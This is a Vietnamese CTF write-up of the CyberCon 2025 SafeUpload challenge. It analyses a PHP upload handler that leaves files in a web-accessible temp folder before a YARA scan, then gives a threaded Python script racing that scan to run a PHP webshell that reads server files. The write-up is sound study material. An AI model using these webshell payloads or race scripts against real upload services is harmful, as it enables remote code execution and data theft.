---
title: CyberCon 2025 SafeUpload Web Challenge
categories: [pentesting, Web-Exploitation, CTF]
tags: [CTF, Web]
---

# CyberCon 2025 SafeUpload Web Challenge 

### Tổng quan challenge

![image](https://hackmd.io/_uploads/Hkm8uTIjll.png)

Mở challenge lên thì ta thấy nó cấp cho ta một giao diện dùng để upload file nên nghi ngờ ban đầu sẽ là web này dính lỗ hổng file upload.

Tiến hành thử upload lên file php với nội dung:

```php 
<?php
echo "test";
?>
```

![image](https://hackmd.io/_uploads/B1guFaUsxx.png)

Có vẻ như đã dính filter của bài có thể thấy nó đã xoá đi file mình upload lên, bây giờ ta thử upload 1 file php nhưng không có nội dung.

![image](https://hackmd.io/_uploads/H1i6F6Loxe.png)

Vẫn là file đó nhưng không có nội dung thì hoàn toàn có thể upload bình thường lên hệ thống. Bây giờ ta tiến hành review source code của bài.

### Phân tích source code

Source code challenge có 3 files chính đó là `index.php`, `upload.php` và `i_dont_like_webshell.yar` với `index.php` sẽ xử lý phần UI UX của web nên ta sẽ bỏ qua file đó và đi với 2 file chính là `upload.php` cùng `i_dont_like_webshell.yar` file `upload.php` sẽ xử lý logic của chức năng upload của bài và `i_dont_like_webshell.yar` là file rule của yara chịu trách nghiệm làm lớp filter cho chức năng upload.

```php 
<?php
declare(strict_types=1);
ini_set('display_errors', '0');

$TMP_DIR = __DIR__ . '/tmp';
$DST_DIR = __DIR__ . '/uploads';
$YARA    = '/usr/bin/yara';
$RULES   = '/var/app/rules/i_dont_like_webshell.yar';

function four_digits(): string {
  return str_pad((string)random_int(0, 9999), 4, '0', STR_PAD_LEFT);
}
function ext_of(string $name): string {
  $e = strtolower(pathinfo($name, PATHINFO_EXTENSION) ?? '');
  return $e ? ".$e" : '';
}
function bad($m,$c=400){ http_response_code($c); echo htmlspecialchars($m,ENT_QUOTES,'UTF-8'); exit; }

if ($_SERVER['REQUEST_METHOD'] !== 'POST') bad('POST only',405);
if (!isset($_FILES['file']) || !is_uploaded_file($_FILES['file']['tmp_name'])) bad('no file');

$orig = $_FILES['file']['name'] ?? 'noname';
$ext  = ext_of($orig);
$rand = four_digits();
$tmp_path = $TMP_DIR . '/' . $rand . $ext;

if (!move_uploaded_file($_FILES['file']['tmp_name'], $tmp_path)) bad('save failed',500);
chmod($tmp_path, 0644);

usleep(800 * 1000);

$out = []; $ret = 0;
$cmd = sprintf('%s -m %s %s 2>&1',
  escapeshellarg($YARA),
  escapeshellarg($RULES),
  escapeshellarg($tmp_path)
);
exec($cmd, $out, $ret);

$stdout   = implode("\n", $out);
$ruleName = 'Suspicious_there_is_no_such_text_string_in_the_image';
$hitByName = (strpos($stdout, $ruleName) !== false);

if ($ret === 1 || $hitByName) {
  @unlink($tmp_path);
  echo "Upload scanned: MALWARE detected. File removed.<br><a href=/>back</a>";
  exit;
} elseif ($ret === 0) {
  $dst = $DST_DIR . '/' . basename($tmp_path);
  if (!@rename($tmp_path, $dst)) { @copy($tmp_path, $dst); @unlink($tmp_path); }
  echo "Upload scanned: OK. Moved to <a href=./uploads/" . htmlspecialchars(basename($dst)) . ">View Guide</a>";
  exit;
} else {
  @unlink($tmp_path);
  bad('scan error',500);
}
```

Đây là phần chịu trách nghiệm xử lý logic chính cho chức năng upload với:

```php 
<?php
declare(strict_types=1);
ini_set('display_errors', '0');

$TMP_DIR = __DIR__ . '/tmp';
$DST_DIR = __DIR__ . '/uploads';
$YARA    = '/usr/bin/yara';
$RULES   = '/var/app/rules/i_dont_like_webshell.yar';
```

- `strict_types=1`: Bật kiểm tra kiểu dữ liệu.
- `display_errors=0`: Không hiển thị lỗi.
 Khai báo:
- Thư mục lưu file tạm.
- Thư mục lưu file hợp lệ.
- Đường dẫn tới YARA và tập rule .yar.

```php
function four_digits(): string {
  return str_pad((string)random_int(0, 9999), 4, '0', STR_PAD_LEFT);
}
```

Đoạn này sẽ tạo ra 4 chữ số ngẫu nhiên (0000 -> 9999) để dùng làm tên file tmp.

```php 
function ext_of(string $name): string {
  $e = strtolower(pathinfo($name, PATHINFO_EXTENSION) ?? '');
  return $e ? ".$e" : '';
}
```

Lấy nguyên phần extension của file từ file gốc.

```php 
function bad($m,$c=400){
  http_response_code($c);
  echo htmlspecialchars($m,ENT_QUOTES,'UTF-8');
  exit;
}
```

Hàm hiển thị lỗi và thoát chương trình.

```php 
if ($_SERVER['REQUEST_METHOD'] !== 'POST') bad('POST only',405);
if (!isset($_FILES['file']) || !is_uploaded_file($_FILES['file']['tmp_name'])) bad('no file');
```
Hàm kiểm tra HTTP request và kiểm tra xem có upload đúng file hay không.

```php 
$orig = $_FILES['file']['name'] ?? 'noname';
$ext  = ext_of($orig);
$rand = four_digits();
$tmp_path = $TMP_DIR . '/' . $rand . $ext;
```

Xử lý file upload lên ở đây nó sẽ lấy tên gốc của file được upload lên sau đó lấy đuôi file gốc và gọi đến hàm `four_digits` để tạo số random từ đó gộp thành đường dẫn tạm thời nó sẽ có dạng `/tmp/XXXX.php`.

```php 
if (!move_uploaded_file($_FILES['file']['tmp_name'], $tmp_path)) bad('save failed',500);
chmod($tmp_path, 0644);
```

Di chuyển file vào thư mục `/tmp` và gán quyền 0644.

```php 
usleep(800 * 1000); // 800ms
```

Delay 800 giây có vẻ để chống brute force.

```php 
$out = []; $ret = 0;
$cmd = sprintf('%s -m %s %s 2>&1',
  escapeshellarg($YARA),
  escapeshellarg($RULES),
  escapeshellarg($tmp_path)
);
exec($cmd, $out, $ret);
```

Chạy yara để kiểm tra file có phải mã độc không nó sẽ ghi kết quả vào `$out` và mã trả về vào `$ret`.

```php 
$stdout   = implode("\n", $out);
$ruleName = 'Suspicious_there_is_no_such_text_string_in_the_image';
$hitByName = (strpos($stdout, $ruleName) !== false);
```

- Gộp đầu ra thành chuỗi.
- Kiểm tra nếu rule tên 'Suspicious_there_is_no_such_text_string_in_the_image' có bị match không.

```php 
if ($ret === 1 || $hitByName) {
  @unlink($tmp_path);
  echo "Upload scanned: MALWARE detected. File removed.<br><a href=/>back</a>";
  exit;
}
```

Xử lý file theo kết quả của yara scan trả về nếu `$ret==1` thì file upload trên sẽ bị xoá.

```php
elseif ($ret === 0) {
  $dst = $DST_DIR . '/' . basename($tmp_path);
  if (!@rename($tmp_path, $dst)) {
    @copy($tmp_path, $dst);
    @unlink($tmp_path);
  }
  echo "Upload scanned: OK. Moved to <a href=./uploads/" . htmlspecialchars(basename($dst)) . ">View Guide</a>";
  exit;
}
```

Với điều kiện `$ret==0` thì sẽ đưa file đó từ `/tmp` sang thư mục `/uploads` và hiển thị link để truy cập file đó.

```php 
else {
  @unlink($tmp_path);
  bad('scan error',500);
}
```

Trong trường hợp yara trả về khác 0/1 thì sẽ trả về lỗi này.

#### Debug và POC 

Với bài này vì không chắc là liệu bên phía backend có thực thi file đuôi php không nên tôi sẽ tiến hành debug trên docker.

![image](https://hackmd.io/_uploads/HyTjFxwiee.png)

Tiến hành đưa file shell.php vào thư mục `/uploads`.

![image](https://hackmd.io/_uploads/Bk7CYxwjgx.png)

Truy cập vào `/uploads/shell.php` có thể thấy php đã được thực thi nên ta có thể nhận định rằng server có thực thi file đuôi `php`.

Vậy hướng khai thác bài này ở đây là gì, ở đây sau khi tìm hiểu thì tôi nhận thấy lớp filter của yara khá là dày và sẽ rất khó có thể bypass qua được nên tôi tìm thêm hướng khai thác khác.

Sau khi đọc lại code tôi thấy có dòng:

```php
usleep(800 * 1000); // 800ms
```

Ở đây theo tôi hiểu thì trước khi yara tiến hành scan thì sẽ có 1 khoảng thời gian sleep là vào khoảng 800ms hay 0.8 giây, vậy liệu ta có thể lợi dụng khoảng thời ngắn này để làm được việc gì không?

Sau khi tìm hiểu thì có phương pháp TOCTOU (Time-of-check to Time-of-use) là một loại lỗi phổ biến trong các tình huống race condition, nơi có sự không đồng bộ giữa quá trình kiểm tra và sử dụng tài nguyên (hoặc dữ liệu) trong một hệ thống.

Giải thích TOCTOU:

TOCTOU xảy ra khi có một sự khác biệt giữa thời điểm khi một điều kiện được kiểm tra và thời điểm khi điều kiện đó thực sự được sử dụng. Trong một hệ thống nhiều tiến trình (multi-threaded) hoặc có sự truy cập đồng thời (concurrent access), một tiến trình có thể kiểm tra một điều kiện (ví dụ: một file có tồn tại hay không) nhưng trong khoảng thời gian giữa lúc kiểm tra và lúc sử dụng tài nguyên đó, tài nguyên có thể đã thay đổi bởi một tiến trình khác.

Ví dụ về TOCTOU:

Giả sử bạn có một đoạn mã kiểm tra nếu một file tồn tại, sau đó tiến hành sử dụng file đó (ví dụ, đọc nội dung). Nếu trong khoảng thời gian giữa việc kiểm tra sự tồn tại của file và việc sử dụng nó, một tiến trình khác đã thay đổi trạng thái của file (ví dụ: xóa file, thay đổi quyền truy cập file, hoặc ghi đè lên file), thì có thể dẫn đến kết quả không mong muốn hoặc hành vi không xác định.

Vậy bây giờ kịch bản đưa ra sẽ là ta sẽ cố gắng lợi dụng thời gian 800ms đó để có thể thực thi cat flag ra và in nó ra vì như ở trên ta đã thử debug web server hoàn toàn có thể tự thực thi `php` và ta sẽ cố định tên file sẽ là `0089.php` vì như đoạn code đã được phân tích trên tên file khi nó di chuyển vào /tmp sẽ được random nên ta sẽ cố định nó lại và chạy nhiều cặp request nhưng trước hết ta sẽ thử debug.

Ta sẽ tiến hành sử dụng burp proxy cùng với đó là script để thử 1 cặp request GET và POST:

```python 
import requests

# Burp Suite Proxy (enable "Intercept" in Burp first)
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

# Target URL and predictable filename
UPLOAD_URL = "http://localhost:8001/upload.php"
FILENAME = "payload.php"  # Fixed 4-digit name
PAYLOAD = b'<?php system("cat /*.txt"); ?>'  # Simple payload

# Prepare the file upload
files = {'file': (FILENAME, PAYLOAD)}

try:
    response = requests.post(
        UPLOAD_URL,
        files=files,
        proxies=proxies,  # Remove this line to skip Burp
        verify=False  # Skip SSL verification if needed
    )
    print(f"POST Response ({response.status_code}):\n{response.text}")
except Exception as e:
    print(f"POST Error: {e}")
```

```python
import requests

# Burp Suite Proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

# Predictable access URL
EXPLOIT_URL = f"http://localhost:8001/tmp/0089.php"

try:
    response = requests.get(
        EXPLOIT_URL,
        proxies=proxies,  # Remove to skip Burp
        verify=False
    )
    print(f"GET Response ({response.status_code}):\n{response.text}")
except Exception as e:
    print(f"GET Error: {e}")
```

![image](https://hackmd.io/_uploads/ryTI2bvsxl.png)

Tiến hành chạy POST ở đây burp đã bắt được đoạn upload lên bây giờ ta sẽ chạy GET và forward xem nó sẽ trả về gì.

![image](https://hackmd.io/_uploads/B1eRsh-vixx.png)

Sau khi forward có thể thấy GET vẫn được trả về nhưng kết quả sẽ là 404 vì ở đây nó sẽ random ra file khác nên nếu chưa trùng tên thì kết quả sẽ không ra bây giờ ta sẽ thử script khai thác.

Ở đây tôi sẽ viết script sẽ gửi POST và GET request sẽ xảy ra nhanh nghĩa là sau khi POST file php lên thì ngay lập tức gửi GET request để lấy nội dung và với vấn đề về đoạn random ở tên file trong thư mục `/tmp` thì mình sẽ để cố định dãy số nào đó `(vd : 0086.php)` và lặp đi lặp lại quá trình request đến khi nó chạm đúng vào file `0086.php` và lấy được flag ở đây mình tạo 10001 request và chờ thôi nếu nhân phẩm tốt thì flag sẽ ra sớm còn không thì chờ.

![image](https://hackmd.io/_uploads/HkeRZn0wsgl.png)

Kiểm tra trong burp xem proxy có hiển thị đủ 2 request không, ở đây nó sẽ liên tục tạo từng cặp POST và GET nên không lo về vấn đề time.

Code Exploit:

```python 
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

# Biến flag để kiểm tra xem có sử dụng proxy hay không
USE_PROXY = False

# Proxy nếu cần debug
proxies = {
    "http": "http://localhost:8080",
    "https": "http://localhost:8080"
} if USE_PROXY else {}

rand_num = "0058"  # Số này có thể thay đổi theo yêu cầu của bạn

# Hàm upload shell
def upload_shell(rand_num):
    url = "http://localhost:8001/upload.php"
    files = {
        "file": ("shell.php", "<?php echo shell_exec('cat /*'); ?>", "application/octet-stream")
    }
    try:
        r = requests.post(url, files=files, timeout=5, proxies=proxies)
        return r.status_code
    except Exception as e:
        return f"upload error: {e}"

# Hàm kiểm tra flag
def try_read():
    url = f"http://localhost:8001/tmp/{rand_num}.php"
    try:
        r = requests.get(url, timeout=5, proxies=proxies)  
        if "cyber" in r.text:
            return r.text.strip()  # Trả về flag nếu tìm thấy
    except Exception:
        return None
    return None

# Hàm chạy song song POST và GET với nhiều threads
def loop_until_flag(max_requests=10000):
    total_requests = 0
    with ThreadPoolExecutor(max_workers=100) as executor:
        while total_requests < max_requests:
            futures_upload = [executor.submit(upload_shell, rand_num) for _ in range(100)]
            futures_read = [executor.submit(try_read) for _ in range(50)]  # Kiểm tra flag với 50 threads
            
            # Chờ tất cả các task (futures) trong futures_upload hoàn thành
            for f in as_completed(futures_upload):
                res = f.result()
                total_requests += 1  # Cập nhật số lượng request đã gửi
                print(f"Upload result: {res}")
            
            # Kiểm tra kết quả từ futures_read
            for f in as_completed(futures_read):
                res = f.result()
                if isinstance(res, str) and "cyber" in res:
                    print(f"[+] Found the flag at attempt {total_requests}")
                    print(f"Found flag: {res}")
                    return res  # Dừng lại khi tìm thấy flag

            print(f"Attempt {total_requests}/{max_requests} - No flag found yet.")

    print(f"Finished {max_requests} requests without finding the flag.")
    return None

if __name__ == "__main__":
    loop_until_flag(10000)  # Chạy cho đến khi gửi hết 10,000 requests hoặc tìm thấy flag

```

Thành công lấy được flag.

![image](https://hackmd.io/_uploads/rkpa77uolx.png)


